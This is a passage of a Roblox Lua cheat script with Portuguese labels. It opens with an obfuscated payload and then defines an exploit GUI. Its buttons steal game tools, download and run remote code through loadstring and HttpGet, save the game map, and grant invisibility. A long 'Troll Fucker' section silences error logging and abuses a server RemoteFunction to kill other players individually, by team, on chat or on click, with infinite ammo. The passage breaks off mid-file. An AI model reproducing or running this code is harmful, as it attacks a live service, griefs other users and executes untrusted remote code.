gefickt]]+(200-0x6f)))..'\97\116',[(-0x24+697)]=(function(e,o)return(e and'㒦㒡㒣㒚㒝㒦㒢㒤㒞㒜㒗㒢㒣㒙')and'\48\159\158\188\10'or'\109\97'end)(((0xc5-162)+-#'testing this thingy lololollez')==(0x84-126))..'\116\104',[(0x5a1+-53)]=(function(e,o)return((1210/0xf2)==(-#[[0nly 1337 smashed ur wap]]+(-0x51+108))and'\48'..'\195'or e..((not'\20\95\69'and'\90'..'\180'or o)))or'\199\203\95'end),["㒣㒜㒟㒡㒚㒘㒤㒛"]='\105\110'..(function(e,o)return(e and'㒚㒣㒚㒣㒜㒟㒟㒞㒙㒦㒞㒝㒘㒢㒟㒤㒤㒦')and'\90\115\138\115\15'or'\115\101'end)((65/0xd)==((-22+0x45)+-#"cruz pp is large"))..'\114\116',["㒝㒛㒠㒥㒠㒝㒠㒙㒟㒣㒛㒞㒥㒝㒗㒗㒠㒥㒛"]='\117\110'..(function(e,o)return(e and'㒙㒜㒣㒟㒘㒟㒙㒞㒚㒣㒚㒚㒡㒞㒗㒙㒤㒤㒣')or'\112\97'or'\20\38\154'end)((0x76-113)==(133-0x66))..'\99\107',["㒡㒞㒥㒟㒙㒠㒠㒢㒜㒘㒤㒙㒛㒣㒚"]='\115\101'..(function(e)return(e and'㒟㒦㒞㒟㒙㒗㒛㒤㒙㒢㒠㒙㒜㒗㒝㒥㒟㒗㒤')and'\110\112\99\104'or'\108\101'end)(((-85+0x69)+-#'howtodumpscript')==(186-0x9b))..'\99\116',["㒤㒗㒝㒗㒦㒝㒞㒢㒣㒚㒣㒤"]='\116\111\110'..(function(e,o)return(e and'㒛㒙㒥㒤㒘㒠㒦㒠㒙㒘㒢㒛')and'\117\109\98'or'\100\97\120\122'end)((((0x901-1178)+-#[[windows xp startup sfx]])/221)==(-#"howtodumpscript"+(-0x53+103)))..'\101\114'},{["㒢㒥㒛㒣㒤㒝㒛㒡㒗㒠"]=((getfenv))},((getfenv))()) end)()



          end            
        })
    JogadorTab:AddButton({
        Name = "Puxar Algema (!)",
        Callback = function()
            for i, v in pairs(game:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Players').LocalPlayer.Backpack
                end
            end
            
            game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
                for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
                    if v:IsA('Tool') then
                        v.Parent = game:GetService('Teams')
                    end
                end
                for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
                    if v:IsA('Tool') then
                        v.Parent = game:GetService('Teams')
                    end
                end
            end)
          end              
        })
    JogadorTab:AddButton({
        Name = "Dex (Visual)",
        Callback = function()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/Explorer/main/README.md'),true))()
          end        
        })
local Section = JogadorTab:AddSection({
	Name = "Recomendado"
})
JogadorTab:AddToggle({
	Name = "Anti Staff (!)",
	Default = false,
	Callback = function(Value)
		print(Value)
	end 
})
JogadorTab:AddToggle({
	Name = "Serial Killer",
	Default = false,
	Callback = function(Value)
		_G.Loop = Value
        Loop()
	end   
})
    JogadorTab:AddToggle({
        Name = "Controll TP Bypassed",
        Default = false,
        Callback = function(Value)
            _G.ControlTP = Value
            ControlTP()
        end    
}) 
JogadorTab:AddToggle({
	Name = "Anti Agarrar (Algema) (!)",
	Default = false,
	Callback = function(Value)
		_G.Algema = Value
		Algema()
	end    
}) 
JogadorTab:AddButton({
	Name = "Invisible Bind",
	Callback = function()
        local ScriptStarted = false
        local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
        local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
        local NoClip = false --Will make your fake character no clip.
        local Player = game:GetService("Players").LocalPlayer
        local RealCharacter = Player.Character or Player.CharacterAdded:Wait()
        local IsInvisible = false
        RealCharacter.Archivable = true
        local FakeCharacter = RealCharacter:Clone()
        local Part
        Part = Instance.new("Part", workspace)
        Part.Anchored = true
        Part.Size = Vector3.new(200, 1, 200)
        Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
        Part.CanCollide = true
        FakeCharacter.Parent = workspace
        FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
        for i, v in pairs(RealCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              local clone = v:Clone()
              clone.Disabled = true
              clone.Parent = FakeCharacter
          end
        end
        if Transparency then
          for i, v in pairs(FakeCharacter:GetDescendants()) do
              if v:IsA("BasePart") then
                  v.Transparency = 0.7
              end
          end
        end
        local CanInvis = true
        function RealCharacterDied()
          CanInvis = false
          RealCharacter:Destroy()
          RealCharacter = Player.Character
          CanInvis = true
          isinvisible = false
          FakeCharacter:Destroy()
          workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
          RealCharacter.Archivable = true
          FakeCharacter = RealCharacter:Clone()
          Part:Destroy()
          Part = Instance.new("Part", workspace)
          Part.Anchored = true
          Part.Size = Vector3.new(200, 1, 200)
          Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
          Part.CanCollide = true
          FakeCharacter.Parent = workspace
          FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
          for i, v in pairs(RealCharacter:GetChildren()) do
              if v:IsA("LocalScript") then
                  local clone = v:Clone()
                  clone.Disabled = true
                  clone.Parent = FakeCharacter
              end
          end
          if Transparency then
              for i, v in pairs(FakeCharacter:GetDescendants()) do
                  if v:IsA("BasePart") then
                      v.Transparency = 0.7
                  end
              end
          end
         RealCharacter.Humanoid.Died:Connect(function()
         RealCharacter:Destroy()
         FakeCharacter:Destroy()
         end)
         Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
        end
        RealCharacter.Humanoid.Died:Connect(function()
         RealCharacter:Destroy()
         FakeCharacter:Destroy()
         end)
        Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
        local PseudoAnchor
        game:GetService "RunService".RenderStepped:Connect(
          function()
              if PseudoAnchor ~= nil then
                  PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
              end
               if NoClip then
              FakeCharacter.Humanoid:ChangeState(11)
               end
          end
        )
        PseudoAnchor = FakeCharacter.HumanoidRootPart
        local function Invisible()
          if IsInvisible == false then
              local StoredCF = RealCharacter.HumanoidRootPart.CFrame
              RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
              FakeCharacter.HumanoidRootPart.CFrame = StoredCF
              RealCharacter.Humanoid:UnequipTools()
              Player.Character = FakeCharacter
              workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
              PseudoAnchor = RealCharacter.HumanoidRootPart
              for i, v in pairs(FakeCharacter:GetChildren()) do
                  if v:IsA("LocalScript") then
                      v.Disabled = false
                  end
              end
              IsInvisible = true
          else
              local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
              FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
         
              RealCharacter.HumanoidRootPart.CFrame = StoredCF
         
              FakeCharacter.Humanoid:UnequipTools()
              Player.Character = RealCharacter
              workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
              PseudoAnchor = FakeCharacter.HumanoidRootPart
              for i, v in pairs(FakeCharacter:GetChildren()) do
                  if v:IsA("LocalScript") then
                      v.Disabled = true
                  end
              end
              IsInvisible = false
          end
        end
        game:GetService("UserInputService").InputBegan:Connect(
          function(key, gamep)
              if gamep then
                  return
              end
              if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
                  if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
                      Invisible()
                  end
              end
          end
        )
        local Sound = Instance.new("Sound",game:GetService("SoundService"))
        Sound.SoundId = "rbxassetid://232127604"
        Sound:Play()
        game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisivel Carregado!",["Text"] = "Pressione "..Keybind.." Para usar o invisivel!",["Duration"] = 20,["Button1"] = "Okay."})
  	end    
})
local Section = JogadorTab:AddSection({
	Name = "Geral"
})
JogadorTab:AddTextbox({
	Name = "Banir Player",
	Default = "Coloque o Nome Do Player Aqui",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
JogadorTab:AddButton({
	Name = "Leaker Mapa (Workspace)",
	Callback = function()
        saveinstance()
	end
})
JogadorTab:AddButton({
	Name = "Troll Fucker",
	Callback = function()
        if getconnections then
            for _, v in pairs(getconnections(game:GetService('ScriptContext').Error)) do
                v:Disable()
            end
        
            for _, v in pairs(getconnections(game:GetService('LogService').MessageOut)) do
                v:Disable()
            end
        end
        if not _G.ini then
            _G.ini = true
        
            local sound = Instance.new('Sound')
            sound.SoundId = 'rbxassetid://216917652'
            sound.Parent = game:GetService('SoundService')
            sound:Play()
        
            local uis = game:GetService('UserInputService')
            local heartbeat = game:GetService('RunService').Heartbeat
            local plrs = game:GetService('Players')
            local rep = game:GetService('ReplicatedStorage')
            local Plr = plrs.LocalPlayer
        
            local Mouse = Plr:GetMouse()
            local killall = false
            local explodeall = false
            local equipkill = false
            local killme = true
            local talkDie = false
            local mouseKill = false
            local mouseExplode = false
            local prefixKill = false
            local explodelol = false
            local gunName
            local explodeRem
            local gunObj
            local CEs
            local SEs
            game.StarterGui:SetCore(
                'SendNotification',
                {
                    Title = 'Pegando remotes...',
                    Text = 'espera ai',
                    Duration = 5
                }
            )
            for i,v in next,rep:GetChildren() do
                if v:IsA('RemoteFunction') and v.Name == 'ChatSystemGetMessage' then
                    killRem = v
                end
            end
            if killRem then
                game.StarterGui:SetCore(
                    'SendNotification',
                    {
                        Title = 'Remote pego',
                        Text = 'Lord#6363',
                        Duration = 5
                    }
                )
            else
                game.StarterGui:SetCore(
                    'SendNotification',
                    {
                        Title = 'Erro nos remotes',
                        Text = 'Avise em: Lord#6363',
                        Duration = 10
                    }
                )
            end
            if explodeRem and explodelol then
                game.StarterGui:SetCore(
                    'SendNotification',
                    {
                        Title = 'Explode kk',
                        Text = 'Talvez seja possivel o uso de explosões',
                        Duration = 7
                    }
                )
            end
            if not explodelol and not killRem then
                game.StarterGui:SetCore(
                    'SendNotification',
                    {
                        Title = 'Erro geral',
                        Text = 'Avise em: Lord#6363',
                        Duration = 5
                    }
                )
                return
            end
            for i, t in pairs(Plr.Backpack:GetChildren()) do
                if t:IsA('Tool') and t:FindFirstChild('NoCol') then
                    gunName = t.Name
                end
            end
            --[[	if not gunName or not killRem and explodeRem then
                game.StarterGui:SetCore('SendNotification', {
                    Title = 'Aviso'; -- the title (ofc)
                    Text = 'O kill está sendo substituido por explode por falta de arma ou remote.'; -- what the text says (ofc)
                    Duration = 10; -- how long the notification should in secounds
                })
            end
            if gunName and killRem and sendKey then
                Plr.Character:BreakJoints()
                game.StarterGui:SetCore('SendNotification', {
                    Title = 'Pegando a key'; -- the title (ofc)
                    Text = 'Vose e gey, use gramatica'; -- what the text says (ofc)
                    Duration = 5; -- how long the notification should in secounds
                })
                
                sendKey.OnClientEvent:connect(function(newKey)
                    remoteKey = newKey
                end)
            end]]
            local banPrefixes = {
                ['!'] = true,
                ['.'] = true,
                [':'] = true,
                [';'] = true,
                ['/'] = true
            }
            local tms = {Revolver = 2, FAL = 2}
            local lolol = tms[gunName] or 5
            local protected = {}
            local protectedTeams = {}
            local tokill = {}
            Plr.CharacterAdded:Connect(
                function(char)
                    if gunName and killRem and sendKey then
                        gunObj = Plr.Backpack:WaitForChild(gunName)
                    end
                    uis.MouseIconEnabled = true
                end
            )
            if gunName and killRem and sendKey then
                repeat
                    wait()
                until gunObj
            end
        
            wait()
            game.StarterGui:SetCore(
                'SendNotification',
                {
                    Title = 'NoCol Fucker | Lord#6363',
                    Text = 'F para esconder/aparecer',
                    Duration = 5
                }
            )
            -- key that opens/closes the ui
            local toggle_key = Enum.KeyCode.F
        
            uis.MouseIconEnabled = true
            local ts = game:GetService('TweenService')
        
            -- ui functions
            fade = function(obj, len, props)
                ts:Create(obj, TweenInfo.new(len, Enum.EasingStyle.Sine), props):Play()
            end
        
            -- shorthand variables
            local u2, c3 = UDim2.new, Color3.fromRGB
            local u2f, c3w = u2(1, 0, 1, 0), c3(255, 255, 255)
        
            -- ui init
            local g = Instance.new('ScreenGui', game.CoreGui)
            local f = Instance.new('Frame', g)
            local t = Instance.new('TextLabel', f)
            local c = Instance.new('ScrollingFrame', f)
        
            -- core ui styling
            local padding = Instance.new('UIPadding', f)
            local maxsize = Instance.new('UISizeConstraint', f)
            local textsize = Instance.new('UITextSizeConstraint', t)
            local listcons = Instance.new('UIListLayout', c)
        
            padding.PaddingBottom = UDim.new(0, 8)
            padding.PaddingLeft = UDim.new(0, 15)
            padding.PaddingRight = UDim.new(0, 15)
            padding.PaddingTop = UDim.new(0, 0)
        
            maxsize.MaxSize = Vector2.new(275, 450)
            maxsize.MinSize = Vector2.new(200, 0)
            textsize.MaxTextSize = 16
            listcons.Padding = UDim.new(0, 3)
        
            -- ui instance properties
            g.Name = 'fodedor de max'
            g.ResetOnSpawn = false
            f.Name = 'main'
            t.Name = 'header'
        
            f.Size = u2(0.165, 0, 0.6, 0)
            f.BorderSizePixel = 0
            f.BackgroundTransparency = 0.3
            f.Position = u2(1, -215, 0.5, -150)
            f.BackgroundColor3 = c3()
            f.AnchorPoint = Vector2.new(1, 0.5)
            f.Position = u2(1, -15, 0.5, 0)
        
            t.Size = u2(1, 0, 0.1, 0)
            t.BackgroundTransparency = 1
            t.TextColor3 = c3w
            t.Font = Enum.Font.GothamBold
            t.TextScaled = true
            t.TextXAlignment = Enum.TextXAlignment.Center
            t.Text = 'BNL Mama gays | Lord#6363'
        
            c.Name = 'playerlist'
            c.Position = u2(0, 0, 0.1, 0)
            c.Size = u2(1, 0, 0.45, 0)
            c.BackgroundTransparency = 1
            c.BorderSizePixel = 0
            c.TopImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png'
            c.BottomImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png'
            c.ScrollingDirection = Enum.ScrollingDirection.Y
            c.ScrollBarThickness = 5
            c.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
        
            -- playerlist entry ui template
            local temp = Instance.new('Frame', f)
            temp.Name = 'temp'
            temp.Visible = false
            temp.Size = u2(1, -5, 0, 27)
            temp.BackgroundTransparency = 0.5
            temp.BorderSizePixel = 0
            temp.ClipsDescendants = true
            temp.BackgroundColor3 = c3()
        
            local tpad = Instance.new('UIPadding', temp)
            tpad.PaddingLeft = UDim.new(0, 5)
            tpad.PaddingRight = UDim.new(0, 5)
        
            local tb = Instance.new('TextButton', temp)
            tb.Name = 'button'
            tb.BackgroundTransparency = 1
            tb.ZIndex = 5
            tb.BorderSizePixel = 0
            tb.Text = ''
            tb.Size = u2(1, 10, 1, 0)
            tb.Position = u2(0, -5, 0, 0)
        
            local tcl = Instance.new('TextLabel', temp)
            tcl.Name = 'username'
            tcl.BackgroundTransparency = 1
            tcl.BorderSizePixel = 0
            tcl.Size = u2f
            tcl.TextColor3 = c3w
            tcl.TextXAlignment = Enum.TextXAlignment.Left
            tcl.TextScaled = true
            tcl.Size = u2(0.6, 0, 1, 0)
            tcl.Font = Enum.Font.Gotham
        
            local tcls = Instance.new('UITextSizeConstraint', tcl)
            tcls.MaxTextSize = 14
        
            local thumb = Instance.new('ImageLabel', temp)
            thumb.Name = 'thumb'
            thumb.Size = u2(0.35, 0, 0.35, 0)
            thumb.SizeConstraint = Enum.SizeConstraint.RelativeXX
            thumb.Position = u2(1, 0, 0, -15)
            thumb.AnchorPoint = Vector2.new(1, 0)
            thumb.BackgroundTransparency = 1
            thumb.BorderSizePixel = 0
        
            -- settings ui
            local sh = Instance.new('TextLabel', f)
            sh.Name = 'settings_header'
            sh.Size = u2(1, 0, 0.1, 0)
            sh.Position = u2(0, 0, 0.55, 0)
            sh.BackgroundTransparency = 1
            sh.BorderSizePixel = 0
            sh.ZIndex = 3
            sh.TextColor3 = c3w
            sh.Font = Enum.Font.GothamBold
            sh.TextScaled = true
            sh.TextXAlignment = Enum.TextXAlignment.Center
            sh.Text = 'Funções'
        
            local shs = Instance.new('UITextSizeConstraint', sh)
            shs.MaxTextSize = 16
        
            local items = Instance.new('ScrollingFrame', f)
            items.Name = 'items'
            items.Size = u2(1, 0, 0.35, 0)
            items.Position = u2(0, 0, 0.65, 0)
            items.BackgroundTransparency = 1
            items.BorderSizePixel = 0
            items.TopImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png'
            items.BottomImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png'
            items.ScrollingDirection = Enum.ScrollingDirection.Y
            items.ScrollBarThickness = 5
            items.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
        
            local itemll = Instance.new('UIListLayout', items)
            itemll.Padding = UDim.new(0, 3)
            local function explodePlayer(plrObj)
                coroutine.resume(
                    coroutine.create(
                        function()
                            if not plrObj then
                                return
                            end
                            if protected[plrObj.Name] then
                                return
                            end
                            if protectedTeams[plrObj.Team.Name] then
                                return
                            end
                            repeat
                                heartbeat:Wait()
                            until plrObj.Character
                            local plrChar = plrObj.Character
                            local hum = plrChar:WaitForChild('HumanoidRootPart')
                            for i = 1, 10 do
                                explodeRem:FireServer(true, hum.Position)
                                wait(0.02)
                            end
                        end
                    )
                )
            end
            local function killPlayer(plrObj)
                coroutine.resume(
                    coroutine.create(
                        function()
                            if not plrObj then
                                return
                            end
                            if protected[plrObj.Name] then
                                return
                            end
                            if protectedTeams[plrObj.Team.Name] then
                                return
                            end
                            --if not killRem or not gunName then explodePlayer(plrObj) return end
                            repeat
                                heartbeat:Wait()
                            until plrObj.Character
                            local plrChar = plrObj.Character
                            local hum = plrChar:WaitForChild('Humanoid')
                            local head = plrChar:WaitForChild('Head')
                            local ff = plrChar:FindFirstChild('ForceField')
                            if ff then
                                repeat
                                    heartbeat:Wait()
                                until not plrChar:FindFirstChild('ForceField')
                            end
                            killRem:InvokeServer(
                                'hit',
                                '}, {  ',
                                math.huge,
                                hum,
                                head,
                                math.huge,
                                Vector3.new(0, -1, 0),
                                math.huge
                            )
                        end
                    )
                )
            end
        
            createSetting = function(name)
                local setting = Instance.new('Frame', items)
                setting.Size = u2(1, -5, 0, 27)
                setting.BackgroundColor3 = c3()
                setting.BackgroundTransparency = 0.5
                setting.BorderSizePixel = 0
        
                local spad = tpad:Clone()
                spad.Parent = setting
        
                local slab = tcl:Clone()
                slab.Name = 'label'
                slab.Parent = setting
                slab.Size = u2(1, 0, 1, 0)
                slab.Text = name
        
                local stbt = tb:Clone()
                stbt.Parent = setting
        
                stbt.MouseEnter:connect(
                    function()
                        fade(setting, 0.25, {BackgroundTransparency = 0.8})
                    end
                )
        
                stbt.MouseLeave:connect(
                    function()
                        fade(setting, 0.25, {BackgroundTransparency = 0.5})
                    end
                )
        
                items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
        
                return stbt
            end
        
            -- settings & functionality
            local function playerConnection(plrObj)
                if plrObj.Name ~= Plr.Name then
                    plrObj.Chatted:Connect(
                        function(msg)
                            local a = string.sub(msg, 1, 1)
                            if (banPrefixes[a] and prefixKill) or talkDie then
                                killPlayer(plrObj)
                            end
                        end
                    )
                end
                plrObj.CharacterAdded:Connect(
                    function(char)
                        if killall or tokill[plrObj.Name] then
                            if killme then
                                killPlayer(plrObj)
                            elseif not killme and plrObj.Name ~= Plr.Name then
                                killPlayer(plrObj)
                            end
                        end
                        if explodeall then
                            if killme then
                                explodePlayer(plrObj)
                            elseif not killme and plrObj.Name ~= Plr.Name then
                                explodePlayer(plrObj)
                            end
                        end
                        if plrObj.Name ~= Plr.Name then
                            char.ChildAdded:Connect(
                                function(c)
                                    if equipkill and c:IsA('Tool') then
                                        killPlayer(plrObj)
                                    end
                                end
                            )
                            char.ChildRemoved:Connect(
                                function(c)
                                    if equipkill and c:IsA('Tool') then
                                        killPlayer(plrObj)
                                    end
                                end
                            )
                        end
                    end
                )
            end
            for i, p in pairs(plrs:GetPlayers()) do
                playerConnection(p)
            end
            plrs.PlayerAdded:Connect(
                function(p)
                    playerConnection(p)
                end
            )
        
            local sound = Instance.new('Sound')
            sound.SoundId = 'rbxassetid://179235828'
            sound.Parent = game:GetService('SoundService')
            local killAllButton = createSetting('Kill All')
            killAllButton.MouseButton1Down:connect(
                function()
                    sound:Play()
                    killall = not killall
                    if killall then
                        fade(killAllButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                        for i, p in pairs(plrs:GetPlayers()) do
                            if killme then
                                killPlayer(p)
                            elseif not killme and p.Name ~= Plr.Name then
                                killPlayer(p)
                            end
                        end
                    else
                        fade(killAllButton.Parent.label, 0.25, {TextColor3 = c3w})
                    end
                end
            )
            if explodelol and explodeRem and gunName then
                local explodeAllButton = createSetting('Explode All')
                explodeAllButton.MouseButton1Down:connect(
                    function()
                        sound:Play()
                        explodeall = not explodeall
                        if explodeall then
                            fade(explodeAllButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                            for i, p in pairs(plrs:GetPlayers()) do
                                if killme then
                                    explodePlayer(p)
                                elseif not killme and p.Name ~= Plr.Name then
                                    explodePlayer(p)
                                end
                            end
                        else
                            fade(explodeAllButton.Parent.label, 0.25, {TextColor3 = c3w})
                        end
                    end
                )
                local mouseExplodeButton = createSetting('Mouse Explode')
                mouseExplodeButton.MouseButton1Down:connect(
                    function()
                        sound:Play()
                        mouseExplode = not mouseExplode
                        if mouseExplode then
                            fade(mouseExplodeButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                        else
                            fade(mouseExplodeButton.Parent.label, 0.25, {TextColor3 = c3w})
                        end
                    end
                )
            end
            --[[local killmeButton = createSetting('Kill Me')
            if killme then
                fade(killmeButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
            else
                fade(killmeButton.Parent.label, 0.25, {TextColor3 = c3w})
            end]]
            --[[killmeButton.MouseButton1Down:connect(function()
                sound:Play()
                killme = not killme
                if killme then
                    fade(killmeButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                else
                    fade(killmeButton.Parent.label, 0.25, {TextColor3 = c3w})
                end
            end)]]
            local equipKillButton = createSetting('Equip Kill')
            equipKillButton.MouseButton1Down:connect(
                function()
                    sound:Play()
                    equipkill = not equipkill
                    if equipkill then
                        fade(equipKillButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                    else
                        fade(equipKillButton.Parent.label, 0.25, {TextColor3 = c3w})
                    end
                end
            )
            local talkKillButton = createSetting('Talk Kill')
            talkKillButton.MouseButton1Down:connect(
                function()
                    sound:Play()
                    talkDie = not talkDie
                    if talkDie then
                        fade(talkKillButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                    else
                        fade(talkKillButton.Parent.label, 0.25, {TextColor3 = c3w})
                    end
                end
            )
            local mouseKillButton = createSetting('Mouse Kill')
            mouseKillButton.MouseButton1Down:connect(
                function()
                    sound:Play()
                    mouseKill = not mouseKill
                    if mouseKill then
                        fade(mouseKillButton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                    else
                        fade(mouseKillButton.Parent.label, 0.25, {TextColor3 = c3w})
                    end
                end
            )
            local prefixkillbutton = createSetting('Prefix Kill')
            prefixkillbutton.MouseButton1Down:connect(
                function()
                    sound:Play()
                    prefixKill = not prefixKill
                    if prefixKill then
                        fade(prefixkillbutton.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
                    else
                        fade(prefixkillbutton.Parent.label, 0.25, {TextColor3 = c3w})
                    end
                end
            )
            Mouse.Button1Down:Connect(
                function()
                    if mouseKill then
                        if Mouse.Target and Mouse.Target.Parent then
                            local name = Mouse.Target.Parent.Name
                            killPlayer(plrs:FindFirstChild(name))
                        end
                    end
                    if mouseExplode then
                        if Mouse.Target and Mouse.Target.Parent then
                            local name = Mouse.Target.Parent.Name
                            explodePlayer(plrs:FindFirstChild(name))
                        end
                    end
                end
            )
            createEntry = function(name, id)
                local entry = temp:Clone()
                entry.Parent = c
        
                entry.username.Text = name
        
                entry.thumb.Image =
                    game:GetService('Players'):GetUserThumbnailAsync(
                id,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
                )
                entry.Visible = true
                entry.LayoutOrder = #c:GetChildren()
                entry.Name = name
        
                local sound = Instance.new('Sound')
                sound.SoundId = 'rbxassetid://3398620867'
                sound.Parent = game:GetService('SoundService')
                -- handle clicking for player
                local thing = 'none'
                local con
                entry.button.MouseButton1Down:connect(
                    function()
                        if thing == 'none' then
                            if uis:IsKeyDown(Enum.KeyCode.LeftControl) then
                                thing = 'kill'
                                entry.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                                con =
                                    plrs[name].CharacterAdded:Connect(
                                        function(char)
                                        killPlayer(plrs[name])
                                    end
                                    )
                                killPlayer(plrs[name])
                            else
                                killPlayer(plrs[name])
                            end
                        elseif thing == 'kill' then
                            thing = 'protect'
                            entry.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                            protected[name] = true
                            if con then
                                con:Disconnect()
                            end
                        else
                            thing = 'none'
                            entry.BackgroundColor3 = c3()
                            protected[name] = nil
                        end
                        killPlayer(game:GetService('Players'):FindFirstChild(name))
                        sound:Play()
                    end
                )
        
                entry.button.MouseEnter:connect(
                    function()
                        fade(entry, 0.25, {BackgroundTransparency = 0.8})
                    end
                )
        
                entry.button.MouseLeave:connect(
                    function()
                        fade(entry, 0.25, {BackgroundTransparency = 0.5})
                    end
                )
            end
        
            createTeamEntry = function(team, id)
                local entry = temp:Clone()
                entry.Parent = c
                entry.username.Text = team.Name
                --entry.thumb.Image = game:GetService('Players'):GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
                entry.Visible = true
                entry.LayoutOrder = #c:GetChildren()
                entry.Name = team.Name
        
                local sound = Instance.new('Sound')
                sound.SoundId = 'rbxassetid://3398620867'
                sound.Parent = game:GetService('SoundService')
                -- handle clicking for player
                local thing = 'none'
                local cons = {}
                entry.button.MouseButton1Down:connect(
                    function()
                        if thing == 'none' then
                            if uis:IsKeyDown(Enum.KeyCode.LeftControl) then
                                thing = 'kill'
                                entry.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                                for i, p in pairs(plrs:GetPlayers()) do
                                    if p.Team.Name == team.Name then
                                        killPlayer(p)
                                        cons[p] =
                                            p.CharacterAdded:Connect(
                                                function(char)
                                                killPlayer(p)
                                            end
                                            )
                                    end
                                end
                            else
                                for i, p in pairs(plrs:GetPlayers()) do
                                    if p.Team.Name == team.Name then
                                        killPlayer(p)
                                    end
                                end
                            end
                        elseif thing == 'kill' then
                            thing = 'protect'
                            entry.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                            for plr, con in pairs(cons) do
                                if con then
                                    con:Disconnect()
                                end
                            end
                            protectedTeams[team.Name] = true
                        else
                            thing = 'none'
                            entry.BackgroundColor3 = c3()
                            protectedTeams[team.Name] = nil
                        end
                        sound:Play()
                    end
                )
                entry.button.MouseEnter:connect(
                    function()
                        fade(entry, 0.25, {BackgroundTransparency = 0.8})
                    end
                )
        
                entry.button.MouseLeave:connect(
                    function()
                        fade(entry, 0.25, {BackgroundTransparency = 0.5})
                    end
                )
            end
        
            deleteEntry = function(name)
                for _, v in pairs(c:GetChildren()) do
                    if v.Name == name then
                        v:Destroy()
                    end
                end
            end
            spawn(
                function()
                    while wait(3) do
                        if gunObj and gunObj:FindFirstChild('Ammo') then
                            gunObj.Ammo.Value = math.huge
                        end
                        if killall then
                            for i, p in pairs(plrs:GetPlayers()) do
                                local c = p.Character
                                if c then
                                    local h = c:FindFirstChildOfClass('Humanoid')
                                    if h and h.Health > 2 then
                                        killPlayer(p)
                                    end
                                end
                            end
                        end
                        if explodeall then
                            for i, p in pairs(plrs:GetPlayers()) do
                                local c = p.Character
                                if c then
                                    local h = c:FindFirstChildOfClass('Humanoid')
                                    if h and h.Health > 2 then
                                        explodePlayer(p)
                                    end
                                end
                            end
                        end
                        for i, p in pairs(plrs:GetPlayers()) do
                            local kill = false
                            if tokill[p.Name] then
                                local c = p.Character
                                if c then
                                    local h = c:FindFirstChildOfClass('Humanoid')
                                    if h and h.Health > 2 then
                                        killPlayer(p)
                                    end
                                end
                            end
                        end
                    end
                end
            )
            uis.InputBegan:connect(
                function(input, gpe)
                    if not gpe then
                        if input.KeyCode == toggle_key then
                            g.Enabled = not g.Enabled
                        end
                    end
                end
            )
        
            -- dragging code, ripped from https://devforum.roblox.com/t/draggable-property-is-hidden-on-gui-objects/107689/5
            local dragging
            local dragInput
            local dragStart
            local startPos
        
            local function update(input)
                local delta = input.Position - dragStart
                f.Position =
                    UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        
            f.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        dragging = true
                        dragStart = input.Position
                        startPos = f.Position
        
                        input.Changed:Connect(
                            function()
                                if input.UserInputState == Enum.UserInputState.End then
                                    dragging = false
                                end
                            end
                        )
                    end
                end
            )
        
            f.InputChanged:Connect(
                function(input)
                    if
                        input.UserInputType == Enum.UserInputType.MouseMovement or
                            input.UserInputType == Enum.UserInputType.Touch
                    then
                        dragInput = input
                    end
                end
            )
        
            uis.InputChanged:Connect(
                function(input)
                    if input == dragInput and dragging then
                        update(input)
                    end
                end
            )
            -- create entry for client
